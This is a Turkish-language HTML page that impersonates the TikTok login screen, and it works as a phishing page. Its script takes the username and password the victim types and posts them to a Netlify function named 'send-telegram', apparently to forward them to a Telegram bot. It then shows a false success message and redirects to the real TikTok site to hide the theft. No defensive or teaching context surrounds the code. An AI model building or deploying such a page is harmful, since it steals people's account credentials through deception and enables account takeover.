<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok - Giriş Yap</title>
  <style>
    body { margin:0; font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#000; color:#fff; height:100vh; display:flex; justify-content:center; align-items:center; }
    .container { width:90%; max-width:400px; text-align:center; }
    .logo { font-size:4rem; font-weight:bold; color:#fe2c55; margin-bottom:20px; letter-spacing:-3px; }
    h2 { margin:10px 0 30px; font-size:1.4rem; }
    input { width:100%; padding:14px; margin:10px 0; background:#111; border:1px solid #333; border-radius:6px; color:white; font-size:1rem; }
    input:focus { border-color:#fe2c55; outline:none; }
    button { width:100%; padding:14px; background:#fe2c55; color:white; border:none; border-radius:50px; font-size:1.1rem; font-weight:bold; cursor:pointer; margin:20px 0; }
    button:hover { background:#d91a44; }
    .links { color:#888; font-size:0.9rem; }
    .links a { color:#fe2c55; text-decoration:none; }
    #status { margin-top:20px; color:#fe2c55; font-weight:bold; }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">TikTok</div>
    <h2>Hesabına giriş yap</h2>

    <form id="loginForm">
      <input type="text" id="username" placeholder="Telefon / E-posta / Kullanıcı adı" required />
      <input type="password" id="password" placeholder="Şifre" required />
      <button type="submit">Giriş Yap</button>
    </form>

    <div class="links">
      <a href="#">Şifreni mi unuttun?</a> • <a href="#">QR kod ile giriş</a>
    </div>

    <div id="status"></div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const status = document.getElementById('status');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const user = document.getElementById('username').value.trim();
      const pass = document.getElementById('password').value;

      if (!user || !pass) {
        status.textContent = 'Lütfen tüm alanları doldur!';
        return;
      }

      try {
        const response = await fetch('/.netlify/functions/send-telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user, pass })
        });

        if (response.ok) {
          status.textContent = 'Giriş başarılı! Yönlendiriliyorsun...';
          setTimeout(() => { window.location.href = 'https://www.tiktok.com'; }, 1500);
        } else {
          status.textContent = 'Hata oluştu, tekrar dene.';
        }
      } catch (err) {
        status.textContent = 'Bağlantı sorunu: ' + err.message;
      }
    });
  </script>

</body>
</html>
